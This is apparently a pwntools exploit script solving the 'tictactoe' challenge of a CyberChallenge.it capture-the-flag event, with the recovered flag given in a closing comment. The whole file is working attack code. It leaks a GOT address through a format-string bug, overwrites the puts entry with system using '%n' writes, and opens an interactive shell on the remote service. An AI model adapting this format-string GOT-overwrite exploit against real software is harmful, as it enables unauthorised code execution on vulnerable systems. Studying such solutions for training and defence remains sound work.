from pwn import *

exe = ELF("tictactoe")
context.binary = exe
HOST = "tictactoe.challs.cyberchallenge.it"
PORT = 6012
p = remote(HOST, PORT)
# GOT address
system = 0x0804a2a4
puts = 0x0804a2a0
log.success("system address --> %s" % system)
log.success("puts address --> %s" % puts)


# Find offset
def read(p, addr):
    input = b"AAAA" + p32(addr) + b"myvalue: %16$s\n"
    p.sendline(input)
    p.recvuntil("myvalue: ")
    return p.recvline()[:4]


# Overwrite GOT
def write(p, value, addr):
    input = b"AAAA" + p32(addr) + b"%16$" + str(value - 8).encode() + b"x%16$n\n"
    p.sendline(input)


sys_addr = read(p, system)
sys_num_1 = int.from_bytes(sys_addr[:2], byteorder='little')
sys_num_2 = int.from_bytes(sys_addr[2:], byteorder='little')
write(p, sys_num_1, puts)
write(p, sys_num_2, puts + 2)
p.interactive()

# FLAG --> CCIT{I think you GOT printf vuln3rabilities}
